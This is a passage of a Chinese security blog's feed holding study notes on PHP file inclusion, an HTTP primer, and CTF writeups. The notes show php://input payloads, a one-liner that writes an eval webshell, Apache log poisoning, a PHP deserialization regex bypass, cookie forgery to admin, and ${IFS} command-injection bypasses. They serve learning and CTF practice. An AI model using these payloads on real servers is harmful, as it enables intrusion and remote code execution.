的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure><p>例如我们平时用来读文件的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure><p>这里读的过滤器为<code>convert.base64-encode</code>，把输入流<code>base64-encode</code>，<code>resource=xxx.php</code>，读取到的<code>xxx.php</code>的内容就会被base64加密显示出来；</p><p>2.写入PHP文件</p><p>使用php://input可以执行PHP语句，但是使用时需要注意，此协议受限于<code>allow_url_include</code>选项，使用方法就是，直接构造url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br></pre></td></tr></table></figure><p>POST过去php语句即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&apos;ls&apos;); ?&gt;   //执行系统命令</span><br><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&quot;kk&quot;]);?&gt;&apos;)?&gt; //写马</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><a href="https://s2.ax1x.com/2019/06/02/VG2jY9.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/02/VG2jY9.png" alt="VG2jY9.png"></a></p></li></ul><h4 id="5-包含Apache日志文件"><a href="#5-包含Apache日志文件" class="headerlink" title="5.包含Apache日志文件"></a>5.包含Apache日志文件</h4><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>用于发现了文件包含漏洞但是无法上传文件，这样的话就无法深度利用此漏洞，这就要用到另一招，找到Apache的日志路径，利用包含漏洞包含Apache的日志文件获取Webshell，需要知道服务器日志的存储路径，且日志文件可读；</p><h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p>apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，如果访问一个不存在的页面，apache也会将这个页面写入access.log中；</p><p><a href="https://s2.ax1x.com/2019/06/02/VGfKIg.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/02/VGfKIg.png" alt="VGfKIg.png"></a></p><p>但是需要注意的是<code>&lt;&gt;</code>和空格都被url转码了，需要使用bp抓包绕过：</p><p><a href="https://s2.ax1x.com/2019/06/02/VGfwi4.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/02/VGfwi4.png" alt="VGfwi4.png"></a></p><p>查看日志文件，发现成功绕过（phpinfo只是用于测试，真正的攻击者会植入一个写马脚本）：</p><p><a href="https://s2.ax1x.com/2019/06/02/VGf7OP.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/02/VGf7OP.png" alt="VGf7OP.png"></a></p><p>接下来攻击者要做的就是确定access.log的位置，包含日志文件即可，本机默认的apache日志文件位置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/access.log/var/log/apache2/error.log</span><br></pre></td></tr></table></figure><p>不知道为什么我Docker里的测试没有成功，可能是因为权限问题，但是改了权限好像也没什么luan用，只好在本机测试，拿下…</p><p><a href="https://s2.ax1x.com/2019/06/02/VG45rt.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/02/VG45rt.png" alt="VG45rt.png"></a></p><p>在一些场景中，log的地址是被修改掉的。可以通过读取相应的配置文件后，再进行包含；</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>更多姿势，未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;初衷是灵活方便，殊不知方便永远是安全最大的敌人。&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="Web安全学习笔记" scheme="https://gardenia30.top/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="file-include" scheme="https://gardenia30.top/tags/file-include/"/>
    
  </entry>
  
  <entry>
    <title>深入了解HTTP请求流程</title>
    <link href="https://gardenia30.top/2019/01/22/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3HTTP%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B/"/>
    <id>https://gardenia30.top/2019/01/22/深入了解HTTP请求流程/</id>
    <published>2019-01-22T11:08:45.000Z</published>
    <updated>2019-02-19T12:25:37.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你知道平时输入一个网址，简单地按下回车以后，客户端和服务端是怎样复杂运作的吗？<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>HTTP(HyperText Transfer)即超文本传输协议，是一种详细规定了浏览器和万维网服务器之间相互通信的规则，是万维网交换信息的基础，它允许将HTML文档从Web服务器传送到Web浏览器；</p><h2 id="发起HTTP请求"><a href="#发起HTTP请求" class="headerlink" title="发起HTTP请求"></a>发起HTTP请求</h2><p>问题很简单，也就是在浏览器地址栏中输入URL(统一资源定位符，简称网址)按下回车就已经发起了这个HTTP请求，很快就会看到请求的返回结果；</p><p>URL的标准格式：<code>协议://服务器IP [:端口]/路径/[?查询]</code></p><p>借助浏览器就可以快速发起一次HTTP请求，当然也可以借助其他工具，例如Linux中的curl命令；</p><h2 id="HTTP协议详解"><a href="#HTTP协议详解" class="headerlink" title="HTTP协议详解"></a>HTTP协议详解</h2><p>HTTP协议是一种无状态的协议，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，一个客户端发出请求，然后服务器返回响应，连接就被关闭了，服务器不保留连接的有关信息；HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据；</p><h3 id="HTTP请求与响应"><a href="#HTTP请求与响应" class="headerlink" title="HTTP请求与响应"></a>HTTP请求与响应</h3><h4 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h4><p>HTTP请求包括3部分，分别是请求行(请求方法)，请求头(消息报头)，请求正文；</p><p>如下为本地测试的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /test/a2.php HTTP/1.1                //请求行</span><br><span class="line">Host: 127.0.0.1                           //请求头</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cache: no-cache</span><br><span class="line">origin: moz-extension://ea79062d-25c1-4d61-82fd-7b0d239923a7</span><br><span class="line">Content-Length: 8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">      //空白行，代表请求头结束</span><br><span class="line">b=123456                                  //请求正文</span><br></pre></td></tr></table></figure><p><strong>请求行：</strong>由三部分组成，第一部分<code>POST</code>为请求方式，第二部分<code>/test/a2.php</code>为该域名的目录下的文件，第三部分为<code>HTTP/1.1</code>说明的是HTTP的版本；</p><p><strong>请求头：</strong><code>HOST</code>为请求的主机地址，<code>User-Agent</code>为浏览器标识，其他内容有待以后学习中更新；</p><p><strong>请求正文：</strong>请求正文是可选的，最常出现在POST方法中；</p><h4 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h4><p>与HTTP请求对应，HTTP响应也是由3部分组成，分别是响应行，响应头，响应正文；</p><p>下面为上述本地测试的响应部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK                            //响应行</span><br><span class="line">Date: Tue, 22 Jan 2019 07:55:57 GMT        //响应头</span><br><span class="line">Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38</span><br><span class="line">X-Powered-By: PHP/5.5.38</span><br><span class="line">Content-Length: 19</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">string(6) &quot;123456&quot;                         //响应正文</span><br></pre></td></tr></table></figure><p><strong>响应行：</strong>有HTTP版本，状态码，以及消息“OK”；</p><p><strong>响应头：</strong>由服务器向客户端发送；</p><p><strong>响应正文：</strong>是服务器向客户端发送的HTML数据；</p><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><ol><li><p>GET</p><p>GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（not HTML），那么返回的文本就是Web容器解析后的HTML源代码，而不是源文件；</p></li><li><p>POST</p><p>和GET方式相似，最大区别就是GET方法没有请求内容，而POST是有请求内容的。POST请求最多用于向服务器发送大量数据，GET虽然也可以，但是有长度限制，并且GET请求会将发送的数据显示在浏览器端，而POST不会；</p></li><li><p>HEAD</p><p>HEAD除了服务器不能在响应里返回消息主体外，其他与GET相同，此方法常用于测试超文本链接的有效性，可访问性和最近的改变。只用于测试资源是否存在，而不用返回消息主体；速度最快；</p></li><li><p>PUT</p><p>用于请求服务器把请求中的实体存储在请求资源下</p></li><li><p>DELETE</p><p>用于请求源服务器删除请求的指定资源</p></li><li><p>TRACE</p></li><li><p>CONNECT</p></li><li><p>OPTIONS</p></li></ol><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><p>客户端发出HTTP请求，服务器端接收后，会向客户端发送响应信息，HTTP响应的第一行最重要的就是HTTP状态码；状态码由三位数字组成，第一位数字定义了响应的类别，且只有一下5种</p><ul><li>1xx：信息提示，表示请求被成功接收，继续处理，范围：100~101；</li><li>2xx：成功，服务器成功处理了请求，范围：200~206；</li><li>3xx：重定向，用于告诉浏览器客户端，它们的访问资源已经被移动，并告诉客户端新的资源地址位置，范围：300~305；</li><li>4xx：客户端错误代码，客户端发送了一些服务器无法处理的东西，范围：400~415；</li><li>5xx：Web服务器自身出现了错误，用于描述服务器的内部错误，范围：500~505；</li></ul><p>常见的状态码：</p><ul><li><p>200：客户端请求成功；</p></li><li><p>302：重定向；</p></li><li><p>404：请求资源不存在；</p></li><li><p>400：客户端请求有语法错误；</p></li><li><p>401：请求未经授权；</p></li><li><p>403：服务器收到请求但是拒绝提供服务；</p></li><li><p>500：服务器内部错误；</p></li><li><p>503：服务器当前无法处理客户端的请求，一段时间以后可能恢复正常；</p></li></ul><h3 id="HTTP消息"><a href="#HTTP消息" class="headerlink" title="HTTP消息"></a>HTTP消息</h3><p>又称HTTP头（HTTP header），由四部分组成：请求头，响应头，普通头，实体头；</p><ol><li><p>请求头：</p><ol><li><p>Host</p><p>主要用于指定被请求资源的Internet主机和端口号；</p></li><li><p>User-Agent</p><p>允许客户端将自己的操作系统，浏览器和其他属性告诉服务器；</p></li><li><p>Referer</p><p>Referer包含一个URL，代表当前访问URL的上一个URL；</p></li><li><p>Cookie</p><p>一段文本用来表示请求者身份等；</p></li><li><p>Range</p><p>可以请求实体的部分内容，多线程下载时会用到这个请求头；</p></li><li><p>x-forward-for</p><p>即XXF头，代表请求端的IP，可以有多个，中间以逗号隔开；</p></li><li><p>Accept</p><p>用于指定客户端接收哪些MIME类型的信息；</p></li><li><p>Accept-Charset</p><p>用于指定客户端接收的字符集</p></li></ol></li><li><p>响应头</p><ol><li><p>Server</p><p>服务器所使用的Web服务器的名称；</p></li><li><p>Set-Cookie</p><p>向客户端设置Cookie；</p></li></ol></li><li><p>实体头</p><ol><li><p>Content-Type</p><p>实体头用于向接收方指示实体的介质类型；</p></li><li><p>Content-Length</p><p>指明实体正文的长度；</p></li></ol></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学无止境，身为萌新，没有学到的知识还有很多很多，希望在日后的学习中这个归纳对我会有所帮助。</p><hr><p>参考书籍：《Web安全深度剖析》《计算机网络》</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;你知道平时输入一个网址，简单地按下回车以后，客户端和服务端是怎样复杂运作的吗？
    
    </summary>
    
      <category term="Web安全学习笔记" scheme="https://gardenia30.top/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="HTTP" scheme="https://gardenia30.top/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>2019-CTF-Writeup合集</title>
    <link href="https://gardenia30.top/2019/01/19/2019-Writeup%E6%80%BB%E7%BB%93/"/>
    <id>https://gardenia30.top/2019/01/19/2019-Writeup总结/</id>
    <published>2019-01-19T09:07:40.000Z</published>
    <updated>2019-11-10T12:02:14.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>本文为大学的一些参加过的CTF比赛的wp集合，一篇篇太零散，让我产生了我自己写博客好像仅仅只写了wp的错觉，所以就将wp全部放到了一起，以后还是多写点技术总结性的文章…<a id="more"></a></p><h1 id="2018安恒杯12月月赛复现"><a href="#2018安恒杯12月月赛复现" class="headerlink" title="2018安恒杯12月月赛复现"></a>2018安恒杯12月月赛复现</h1><p>萌新因为种种原因没有做安恒12月的月赛题，正巧这几天发现复现，又学到了新知识！<!--more--></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>题目<code>index.php</code>给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题一开始没看懂到底是啥意思，一开始定义了一个baby类，然后在下面完全没有用到有关这个类的任何东西，所以身为萌新的我一脸蒙圈……后来经过仔细地阅读代码，大量的查阅资料，现了其中的猫腻……</p><p><strong>分析：</strong></p><ol><li><p>代码一开始包含文件<code>flag.php</code>；</p></li><li><p>然后定义了一个类，类成员变量<code>$file</code>,重写<code>__toString()</code>方法，这个方法就是将以<code>$filename</code>为文件名的文件输出；</p></li><li><p>接着对<code>data</code>进行正则匹配<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches)</code>，匹配结果放入<code>$matches</code>，匹配成功就<code>die(&#39;Hacker!&#39;)</code>，不成功就对输入的<code>$data</code>进行反序列化并输出；</p></li></ol><p><strong>解题方法：</strong></p><p>其实这个题理解了以后就不难了，目标是输出<code>flag.php</code>的内容，所以构造的<code>data</code>肯定也与包含的文件名相关；</p><p>先对<code>flag.php</code>进行序列化并输出，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;file=<span class="string">'flag.php'</span>;</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span>($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong><em>测试结果输出：</em></strong><code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>直接GET这个值会匹配正则表达式，所以就要想办法绕过；</p><p><strong>绕过方法</strong>：该函数设计的初衷是为了不让<code>Object</code>类型被反序列化，然而正则不够严谨，我们可以在对象长度前加一个<code>+</code>号，即<code>O:4 -&gt; O:+4</code>，即可绕过这层检测，从而使得我们可控的数据传入<code>unserialize</code>函数；</p><p>构造如下：<code>O:+4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>将这个字符传入<code>unserialize</code>函数以后会直接反序列化出一个<code>baby</code>的对象<code>$good</code>，<code>$good-&gt;file</code>是<code>flag.php</code>，反序列化后会直接默认调用魔术方法<code>__toString()</code>输出文件内容；</p><p>所以归根结底还是一个正则绕过+反序列化的问题，将构造的<code>data</code>经过URL编码以后GET进去即可得到flag；(不知道为啥直接在浏览器里传参没用，所以就用bp构造GET了一下)</p><p><code>payload:?data=O%3A%2b4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCMhtS.png" alt="kCMhtS.png"></p><p>反序列化漏洞参考链接：</p><p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p><p><a href="https://xz.aliyun.com/t/3017" target="_blank" rel="noopener">https://xz.aliyun.com/t/3017</a></p><p><a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a></p><h3 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h3><p>这题拿到以后没有切入点…老办法…扫一波目录，发现<code>admin.php</code>和<code>config.php</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCJwDJ.png" alt="kCJwDJ.png"></p><p>进入<code>admin.php</code>发现<code>You are not admin…</code>，基本定下思路就是伪造管理员身份登录，查看请求头中的信息发现cookie的<code>user=dXNlcg%3D%3D</code>推测为base64编码，解码为<code>user</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCJIUI.png" alt="kCJIUI.png"></p><p>要求以管理员身份登录，于是伪造<code>user</code>为<code>admin</code>，base64编码一下修改cookie的值为<code>YWRtaW4=</code>；刷新网页后发现进入了如下界面；</p><p><img src="https://s2.ax1x.com/2019/01/19/kCYCGV.png" alt="kCYCGV.png"></p><p>输入<code>ls</code>发现回显；</p><p><img src="https://s2.ax1x.com/2019/01/19/kCYeaR.png" alt="kCYeaR.png"></p><p>输入<code>ls /</code>想查看根目录报错<code>error</code>，输入<code>cat admin.php</code>报错，设想是过滤了空格，Google了一下空格的绕过方式如下：<strong>IFS的默认值为：空白（包括：空格，tab, 和新行)</strong></p><p><img src="https://s2.ax1x.com/2019/01/19/kCtlYq.md.png" alt="kCtlYq.md.png"></p><p>用<code>${IFS}</code>尝试绕过，输入<code>ls${IFS}/</code>,发现回显中有flag信息：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCto1f.png" alt="kCto1f.png"></p><p>直接<code>cat${IFS}/ffLAG_404</code>得到flag：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCtbng.png" alt="kCtbng.png"></p><p>事后想查看admin.php和config.php的内容，发现<code>${IFS}</code>无效，于是尝试<code>&lt;&gt;</code>成功，直接<code>cat&lt;&gt;admin.php和config.php</code>即可；</p><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])||$_SESSION[<span class="string">'admin'</span>]===<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"You are not admin..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">$retval = <span class="keyword">array</span>();</span><br><span class="line">exec($cmd, $retval, $status);</span><br><span class="line"><span class="comment">// var_dump($retval);</span></span><br><span class="line"><span class="keyword">if</span> ($status == <span class="number">0</span>) &#123;</span><br><span class="line">$res = implode(<span class="string">"\n"</span>,$retval);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">'error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./templates/admin.html'</span>;</span><br></pre></td></tr></table></figure><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现确实用<code>waf_exec()</code>函数过滤了<code>空格，&gt;，{，}</code>等一系列符号，但是没有过滤<code>&lt; / $</code>，所以可以直接用<code>&lt;和$IFS</code>绕过即可；</p><p>参考链接：<a href="http://www.k0rz3n.com/2017/07/30/cookie/#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8Ccookie-%E6%AC%BA%E9%AA%97" target="_blank" rel="noopener">cookie欺骗</a>，<a href="https://www.anquanke.com/post/id/84920" target="_blank" rel="noopener">命令执行的绕过技巧</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="juju"><a href="#juju" class="headerlink" title="juju"></a>juju</h3><p>拿到图片丢进16进制编辑器，查找flag无果，发现是png图片就查看一下文件头，发现貌似没什么问题，看到图片的高度和长度不一样，于是都改成04，图片的下一截显现出来：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCN7P1.png" alt="kCN7P1.png"></p><p>得到的编码为base32，直接解码md5一下即可</p><p><img src="https://s2.ax1x.com/2019/01/19/kCNfrF.png" alt="kCNfrF.png"></p><h1 id="2019安恒杯1月月赛复现"><a href="#2019安恒杯1月月赛复现" class="headerlink" title="2019安恒杯1月月赛复现"></a>2019安恒杯1月月赛复现</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h3><p>考察的知识点：</p><ol><li>PHP反序列化；</li><li>POP链的构造；</li></ol><p>此题给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span 